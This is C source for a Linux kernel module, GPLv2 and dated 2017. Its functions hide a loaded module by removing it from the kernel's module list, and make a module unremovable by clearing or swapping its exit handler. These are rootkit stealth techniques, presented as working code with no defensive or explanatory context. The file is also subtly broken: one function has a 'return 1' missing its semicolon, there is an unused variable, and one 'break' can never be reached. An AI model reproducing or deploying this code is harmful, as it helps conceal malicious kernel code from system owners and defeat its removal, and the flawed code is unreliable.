/*
 *                                Copyright (C) 2017 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include <linux/incantations.h>
#include <linux/get_modules_list.h>
#include <linux/init.h>
#include <linux/module.h>

static struct list_head *g_modules = NULL;

static struct module *find_lkm(const char *name);

int native_icloak_ko(const char *name) {
    struct module *lkm;

    if (g_modules == NULL) {
        g_modules = get_modules_list();
    }

    if (g_modules == NULL || name == NULL) {
        return 1;
    }

    preempt_disable();

    if ((lkm = find_lkm(name)) != NULL) {
        list_del_init(&lkm->list);
    }

    preempt_enable();

    return (lkm != NULL) ? 0 : 1;
}

int native_icloak_mk_ko_perm(const char *name, void **exit) {
    struct module *lkm;

    if (g_modules == NULL) {
        g_modules = get_modules_list();
    }

    if (g_modules == NULL || name == NULL) {
        return 1;
    }

    preempt_disable();

    if ((lkm = find_lkm(name)) != NULL) {
        if (exit != NULL) {
            *exit = lkm->exit;
        }

        lkm->exit = NULL;
    }

    preempt_enable();

    return (lkm != NULL) ? 0 : 1;
}

int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
    struct module *lkm;

    if (g_modules == NULL) {
        g_modules = get_modules_list();
    }

    if (g_modules == NULL || name == NULL || exit == NULL) {
        return 1
    }

    preempt_disable();

    if ((lkm = find_lkm(name)) != NULL) {
        lkm->exit = exit;
    }

    preempt_enable();

    return (lkm != NULL && lkm->exit == exit) ? 0 : 1;
}

static struct module *find_lkm(const char *name) {
    struct module *p;
    size_t name_size;

    name_size = strlen(name);

    list_for_each_entry(p, g_modules, list) {
        if (strcmp(p->name, name) == 0) {
            return p;
            break;
        }
    }

    return NULL;
}
